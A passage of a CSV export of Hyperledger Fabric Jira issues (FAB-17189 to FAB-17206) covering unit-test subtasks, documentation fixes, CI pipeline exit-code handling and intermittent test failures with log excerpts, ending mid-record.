add unit test for getRevisions(),FAB-17189,43541,43310,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,Senthil1,Senthil1,04/Dec/19 11:41 PM,28/Jan/20 4:42 AM,28/Oct/23 3:09 AM,28/Jan/20 4:42 AM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,dereckluo,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015pn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,Senthil1,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jan/20 6:34 AM;dereckluo;https://github.com/hyperledger/fabric/pull/543
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add unit test for buildCommittersForNs(),FAB-17190,43542,43310,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,Senthil1,Senthil1,04/Dec/19 11:58 PM,04/Feb/20 2:52 AM,28/Oct/23 3:09 AM,04/Feb/20 2:52 AM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,dereckluo,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015pv:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,Senthil1,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jan/20 4:42 AM;dereckluo;https://github.com/hyperledger/fabric/pull/567;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add unit test for buildCommitters(),FAB-17191,43543,43310,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,Senthil1,Senthil1,04/Dec/19 11:58 PM,04/Feb/20 2:52 AM,28/Oct/23 3:09 AM,04/Feb/20 2:52 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,dereckluo,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015q3:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jan/20 6:44 AM;dereckluo;https://github.com/hyperledger/fabric/pull/567;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add unit test for executeCommitter() and commitUpdates(),FAB-17192,43544,43310,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,Senthil1,Senthil1,05/Dec/19 12:00 AM,08/Feb/20 4:00 AM,28/Oct/23 3:09 AM,08/Feb/20 4:00 AM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,dereckluo,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015qb:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,Senthil1,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Feb/20 11:39 PM;dereckluo;https://github.com/hyperledger/fabric/pull/621;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add unit test for LoadCommittedVersion(),FAB-17193,43545,43310,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,Senthil1,Senthil1,05/Dec/19 12:00 AM,04/Feb/20 8:47 AM,28/Oct/23 3:09 AM,04/Feb/20 8:47 AM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,dereckluo,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015qj:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Feb/20 11:43 PM;dereckluo;I think this unit test has already been implemented here: https://github.com/hyperledger/fabric/blob/master/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb_test.go#L1164

could you confirm that [~manish-sethi], thanks. ;;;","04/Feb/20 5:52 AM;manish-sethi;[~dereckluo]- yes, you are right. This can be closed - thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Increase cfgTimeout in pte-main.js file,FAB-17195,43549,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rameshthoomu,rameshthoomu,05/Dec/19 3:10 AM,05/Dec/19 11:29 PM,28/Oct/23 3:09 AM,05/Dec/19 11:29 PM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-quality,,,,,,,,,0,,,,,,"Observed proposal failure errors on FAB-7929-8i test case. Increase ""cfgTimeout""  to 300s in pte-main.js file in master branch. ",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015rf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Dec/19 11:29 PM;rameshthoomu;[https://github.com/hyperledger/fabric-test/pull/12] - master;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix broken md structures in docs on peerlifecycle commands,FAB-17196,43550,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,tatsu-sato,tatsu-sato,tatsu-sato,05/Dec/19 3:44 AM,10/Jan/20 7:51 AM,28/Oct/23 3:09 AM,10/Jan/20 7:51 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"There are broken markdown structures in documents on peerlifecycle commands.

The target documents are following:
 - docs/source/commands/peerlifecycle.md
 - docs/wrappers/peer_lifecycle_chaincode_postscript.md

The broken parts are following:

1. Missing a close back-quotation
{noformat}
``peer lifecycle chaincode checkcommitreadiness command, which will return
{noformat}
It should be:
{noformat}
``peer lifecycle chaincode checkcommitreadiness`` command, which will return
{noformat}
2. Missing an itemized text
{noformat}
     * ```
    export ORDERER_CA=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem
{noformat}
An explanation should be added after “**” or “**” should be removed.",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015rn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE test results counters should be printed with the error object,FAB-17197,43553,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,scottz,scottz,05/Dec/19 4:36 AM,10/Dec/19 5:40 AM,28/Oct/23 3:09 AM,09/Dec/19 3:31 PM,,,,,,,,,,v1.4.5,v2.0.0,,,fabric-quality,,,,,,,,,0,,,,,,"When PTE exits, if the counters are not perfect, it returns non-zero value with a new Error object. It would be helpful to print the json structure with all the test counters, as part of the error object too, so they are readily available to anyone viewing the test results in the CI displays.

 

/home/jenkins/gopath/src/github.com/hyperledger/fabric-test/tools/PTE/pte-main.js:1987

throw new Error('[performance_main] Test ran, but failed with errors. Exiting...');

 ",,bharadwajambati1,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16240,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx6",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,scottz,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,release-2.4,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Dec/19 12:23 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/17/commits/43d88c1008c7ba3d9b8ef3b35163b26b8f41b93e];;;","10/Dec/19 12:28 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/23/commits/e81f196852027ab7fbbfdf93be8ad141fc421ee1] for release-1.4 branch;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add new test network tutorial,FAB-17199,43560,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,05/Dec/19 9:29 AM,13/Dec/19 6:00 AM,28/Oct/23 3:09 AM,13/Dec/19 6:00 AM,,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,Add new test network tutorial to getting started. This will be a introductory replacement for BYFN that users will read after downloading the samples and binaries,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i015t7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure core/ledger/util/couchdb,FAB-17200,43603,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,caod,caod,05/Dec/19 11:35 PM,19/Mar/20 5:38 AM,28/Oct/23 3:09 AM,19/Mar/20 5:38 AM,,,,,,,,,,,,,,,,,,,,,,,0,ci-flake,,,,,[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3117/logs/69],,caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17375,,,,,,,,,,,,,"06/Dec/19 3:27 AM;caod;ut-couchdb.log.zip;https://jira.hyperledger.org/secure/attachment/18002/ut-couchdb.log.zip",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015u3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 5:37 AM;sykesm;Relevant bit from the log:

{code}
2019-12-05T09:22:11.7166902Z [36m2019-12-05 09:21:55.745 UTC [couchdb] handleRequest -> DEBU 724[0m Error handling CouchDB request. Error:not_found,  Status Code:404,  Reason:Database does not exist.
2019-12-05T09:22:11.7167973Z --- FAIL: TestDBRequestTimeout (1.12s)
2019-12-05T09:22:11.7168046Z     couchdb_test.go:634: 
2019-12-05T09:22:11.7168132Z         	Error Trace:	couchdb_test.go:634
2019-12-05T09:22:11.7168183Z         	Error:      	An error is expected but got nil.
2019-12-05T09:22:11.7168232Z         	Test:       	TestDBRequestTimeout
2019-12-05T09:22:11.7168310Z         	Messages:   	Error should have been thown while trying to create a couchdb instance with a connection timeout
2019-12-05T09:22:11.7168657Z [36m2019-12-05 09:21:55.745 UTC [couchdb] VerifyCouchConfig -> DEBU 725[0m Entering VerifyCouchConfig()
{code};;;","19/Mar/20 5:38 AM;sykesm;The failure wasn't searchable so a new issue was opened. Hence, the older issue is a duplicate of the newer issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Added in a Java Contract - quick start document,FAB-17201,43605,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,mbwhite,mbwhite,mbwhite,06/Dec/19 12:10 AM,13/Jan/20 11:19 PM,28/Oct/23 3:09 AM,13/Jan/20 11:19 PM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"A quick start tutorial that was originally written for uses on RocketChat.

Best to be pulled into the main docs.

 

 ",,heatherp,mbwhite,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015ub:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),heatherp,mbwhite,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Jan/20 10:40 PM;mbwhite;https://github.com/hyperledger/fabric/pull/371;;;","13/Jan/20 11:19 PM;heatherp;As discussed with Pam, this work is going to be covered by fabric docs updates that her team is doing, so closing this one;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove dead make targets from Makefile,FAB-17202,43606,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,rameshthoomu,rameshthoomu,rameshthoomu,06/Dec/19 12:49 AM,06/Dec/19 1:05 AM,28/Oct/23 3:09 AM,06/Dec/19 1:05 AM,v1.4.4,,,,,,,,,v1.4.4,,,,fabric-quality,,,,,,,,,0,,,,,,"With the recent changes (Disable behave, lte and ote tests) in fabric-test, I see there are few dead make targets in fabric-test master and release-1.4 branches. Keep only valid make targets and delete all the dead make targets.",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015uj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric-test azure pipeline does not reflect test failures or test suite cleanup errors,FAB-17203,43607,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,suryalnvs,scottz,scottz,06/Dec/19 12:58 AM,14/Feb/20 12:19 AM,28/Oct/23 3:09 AM,14/Feb/20 12:19 AM,v1.4.5,v2.0.0,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"To correctly reflect failures in the azp pipeline results, we should return failure codes from ""Run Test"" scripts when tests fail.

The fabric-test/regression/smoke/runSmokeTestSuite.sh script does not use non-zero exit code if any of the tests fail for the NL+PTE or the operator based tests, which means we always see a green checkmark in the pipeline, for the ""Run Smoke Tests"" task. The script does not use ""-e"" option for bash, so we are ignoring test results and not passing them along the pipeline. For example [https://dev.azure.com/Hyperledger/Fabric-Test/_build/results?buildId=3141&view=logs&j=1d99425b-0e5e-525f-8602-4964d4d27096]

We must run all the tests, and archive logs, so do NOT use bash ""-e"" option. Instead, just accumulate each test result (which is nonzero if the test command fails) by ""OR""ing the result into a local exitcode variable, and then the last line in the script should be ""exit $exitcode"".

Same fix is needed for the fabric-test/regression/daily/runPteTestSuite.sh.",,scottz,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16760,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),scottz,suryalnvs,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Feb/20 12:19 AM;suryalnvs;[https://github.com/hyperledger/fabric-test/pull/84] - release-1.4;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in fabric/gossip/comm,FAB-17204,43608,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,caod,caod,06/Dec/19 3:25 AM,23/Nov/20 11:37 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,ci-flake,,,,,"Below message repeats many times:
2019-12-05T17:32:04.5250690Z [33m2019-12-05 17:12:33.479 UTC [gossip.comm] sendToEndpoint -> WARN 14213[0m Failed obtaining connection for 127.0.0.1:38823, PKIid:3132372e302e302e313a3338383233 reason: conn store is closing

Then:
panic: test timed out after 20m0s
2019-12-05T17:32:04.5303463Z FAIL	github.com/hyperledger/fabric/gossip/comm	1200.154s

Logs: [https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3156/logs/80]

Attached as well",,caod,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Dec/19 3:25 AM;caod;ut-gossip-comm.log.zip;https://jira.hyperledger.org/secure/attachment/18001/ut-gossip-comm.log.zip",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01h82:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jan/20 4:27 AM;manish-sethi;Another instance of this with log messages as in the existing attachment - [https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=5194&view=results] for an unrelated PR - https://github.com/hyperledger/fabric/pull/482;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in gossip service: TestWithStaticDeliverClientNotLeader,FAB-17205,43609,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,caod,caod,06/Dec/19 3:31 AM,23/Nov/20 11:37 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,ci-flake,,,,,"2019-12-05T17:14:57.6117935Z --- FAIL: TestWithStaticDeliverClientNotLeader (30.00s)
2019-12-05T17:14:57.6118478Z     gossip_service_test.go:627: Failed to establish full channel membership. Only 0 out of 2 peers have full membership

[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3146/logs/79]",,caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Dec/19 3:31 AM;caod;ut-gossip-service.log.zip;https://jira.hyperledger.org/secure/attachment/18003/ut-gossip-service.log.zip",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01h81:i",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 6:48 AM;denyeart;Recurrence in FAB-17451;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent IT failure in nwo/configblock,FAB-17206,43610,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,caod,caod,06/Dec/19 3:39 AM,19/Mar/20 5:37 AM,28/Oct/23 3:09 AM,19/Mar/20 5:37 AM,,,,,,,,,,,,,,,,,,,,,,,0,ci-flake,,,,,"[Fail] EndToEnd single node etcdraft network with remapped orderer endpoints [It] creates and updates channel  
/home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/nwo/configblock.go:205 
 
 
